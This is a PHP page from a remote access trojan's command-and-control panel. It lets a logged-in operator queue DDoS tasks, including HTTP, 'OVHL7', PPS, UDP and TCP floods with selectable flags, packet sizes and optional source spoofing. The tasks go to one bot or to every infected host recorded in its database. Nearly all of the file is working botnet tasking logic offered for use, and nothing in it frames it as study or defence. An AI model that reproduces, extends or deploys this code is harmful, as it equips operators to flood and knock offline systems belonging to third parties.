<?php
  # Necessary at the top of every page for session management
  session_start();

  # If the RAT user isn't authenticated
  if (!isset($_SESSION["authenticated"]))
  {
    # Redirects them to 403.php page
    header("Location: ./403.php");
  }
  # Else they are authenticated
  else
  {
    # Includes the RAT configuration file
    include "./config/config.php";

    # Establishes a connection to the RAT database
    # Uses variables from "config/config.php"
    # "SET NAMES utf8" is necessary to be Unicode-friendly
    $dbConnection = new PDO("mysql:host=$dbHost;dbname=$dbName", $dbUser, $dbPass, array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8"));
  }
?>
<?php
        # If the user clicked "Task Command"
        if (isset($_POST["submit"]))
        {
          # If all fields are set
          # Prevent null entries from being added to the "tasks" table
          if (isset($_POST["hostname"]) && !empty($_POST["hostname"]) && isset($_POST["ip"]) && !empty($_POST["ip"]) && isset($_POST["port"]) && !empty($_POST["port"]) && isset($_POST["time"]) && !empty($_POST["time"]))
          {
            if($_POST["hostname"] != "all connected bots" && $_POST["hostname"] != "all bots") {
              $hostname[] = $_POST["hostname"]; # Hostname that was selected
            } else {
              if($_POST["hostname"] == "all connected bots") {
                $statement = $dbConnection->prepare("SELECT hostname FROM hosts where status = 'connected'");
                $statement->execute();
                $hostname = $statement->fetchAll(PDO::FETCH_COLUMN, 0);
              } else {
                $statement = $dbConnection->prepare("SELECT hostname FROM hosts");
                $statement->execute();
                $hostname = $statement->fetchAll(PDO::FETCH_COLUMN, 0);
              }
            }
            if($_POST["seltask"] == "HTTP") {
              if(isset($_POST["path"]) && !empty($_POST["path"]) && isset($_POST["method"]) && !empty($_POST["method"])) {
                $command = $_POST["ip"]."|".$_POST["port"]."|".$_POST["time"]."|".$_POST["path"]."|".$_POST["method"]."|".$_POST["power"];   # Command that was entered
              } else {
                echo "<br><div class='alert alert-danger'>Please fill out all fields.</div>";
              }
            } else if($_POST["seltask"] == "OVHL7") {
              if(isset($_POST["power"]) && !empty($_POST["power"])) {
                $command = $_POST["ip"]."|".$_POST["port"]."|".$_POST["time"]."|".$_POST["power"];   # Command that was entered
              } else {
                echo "<br><div class='alert alert-danger'>Please fill out all fields.</div>";
              }
            } else if($_POST["seltask"] == "PPS") {
              if(isset($_POST["power"]) && !empty($_POST["power"])) {
                $command = $_POST["ip"]."|".$_POST["port"]."|".$_POST["time"]."|".$_POST["power"];   # Command that was entered
              } else {
                echo "<br><div class='alert alert-danger'>Please fill out all fields.</div>";
              }
            } else if($_POST["seltask"] == "UDP") {
              if(isset($_POST["packetsize"]) && !empty($_POST["packetsize"])) {
                if(isset($_POST["spoofit"])) {
                  $command = $_POST["ip"]."|".$_POST["port"]."|".$_POST["time"]."|".$_POST["packetsize"]."|1|".rand(1,31);   # Command that was entered
                } else {
                  $command = $_POST["ip"]."|".$_POST["port"]."|".$_POST["time"]."|".$_POST["packetsize"]."|1";   # Command that was entered
                }
              }
            } else if($_POST["seltask"] == "TCP") {
              if(isset($_POST["packetsize"]) && !empty($_POST["packetsize"])) {
                if(isset($_POST["checkboxes"])) {
                  $flags = implode(", ", $_POST["checkboxes"]);
                  if($flags == "syn, rst, fin, ack, psh") {
                    $flags = "all";
                  }
                  if(isset($_POST["spoofit"])) {
                    $command = $_POST["ip"]."|".$_POST["port"]."|".$_POST["time"]."|".$flags."|".$_POST["packetsize"]."|1|".rand(1,31);   # Command that was entered
                  } else {
                    $command = $_POST["ip"]."|".$_POST["port"]."|".$_POST["time"]."|".$flags."|".$_POST["packetsize"]."|1";   # Command that was entered
                  }
                } else {
                  echo "<br><div class='alert alert-danger'>Please check at least one method.</div>";
                }
              } else {
                echo "<br><div class='alert alert-danger'>Please fill out all fields.</div>";
              }
            } else {
              $command = $_POST["ip"]."|".$_POST["port"]."|".$_POST["time"];   # Command that was entered
            }
            if(isset($command)) {
              $username = $_SESSION["username"]; # Current logged in user

              # Inserts user, action, hostname, and secondary into "tasks" table
              foreach($hostname as $value) {
                $statement = $dbConnection->prepare("INSERT INTO tasks (user, action, hostname, secondary) VALUES (:user, :action, :hostname, :secondary)");
                $statement->bindValue(":user", $username);
                $statement->bindValue(":action", $_POST["seltask"]);
                $statement->bindValue(":hostname", $value);
                $statement->bindValue(":secondary", $command);
                $statement->execute();
    
                # Inserts usern, hostname, action, secondary, and status into "output" table
                $statement = $dbConnection->prepare("INSERT INTO output (user, hostname, action, secondary, status) VALUES (:user, :hostname, :action, :secondary, :status)");
                $statement->bindValue(":user", $username);
                $statement->bindValue(":hostname", $value);
                $statement->bindValue(":action", $_POST["seltask"]);
                $statement->bindValue(":secondary", $command);
                $statement->bindValue(":status", "N");
                $statement->execute();
              }

              # Kills database connection
              $statement->connection = null;

              # Displays success message - "Successfully tasked command. Redirecting back to command.php in 3 seconds. Do not refresh the page."
              echo "<br><div class='alert alert-success'>Successfully tasked command. Redirecting back to command.php in 3 seconds. Do not refresh the page.</div>";

              # Waits 3 seconds, then redirects to commandSubmit.php
              # This is a hack to clear out the POST data
              header('Refresh: 3; URL=./tasks.php');
            }
          }
          else
          {
            # Displays error message - "Please fill out all fields."
            echo "<br><div class='alert alert-danger'>Please fill out all fields.</div>";
          }
        }
      ?>